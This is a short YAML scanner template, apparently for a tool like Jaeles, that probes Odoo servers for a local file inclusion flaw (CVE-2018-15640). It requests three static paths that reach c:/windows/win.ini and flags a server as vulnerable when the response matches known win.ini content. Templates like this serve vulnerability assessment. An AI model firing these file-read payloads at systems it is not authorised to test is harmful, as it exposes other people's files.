id: cve-2018-15640
info:
  name: Odoo LFI
  risk: High

params:
  - root: "{{.BaseURL}}"

variables:
  - endpoint: |
      /base_import/static/c:/windows/win.ini
      /web/static/c:/windows/win.ini
      /base/static/c:/windows/win.ini

requests:
  - method: GET
    redirect: false
    url: >-
      {{.root}}/{{.endpoint}}
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - X-Requested-With: XMLHttpRequest
      - Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      - Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
      - Accept-Encoding: gzip, deflate
    detections:
      - >-
        StatusCode() == 200 && StringSearch("body", "for 16-bit app support") && StringSearch("body", "[fonts]")

references:
  - https://www.cvebase.com/cve/2018/15640
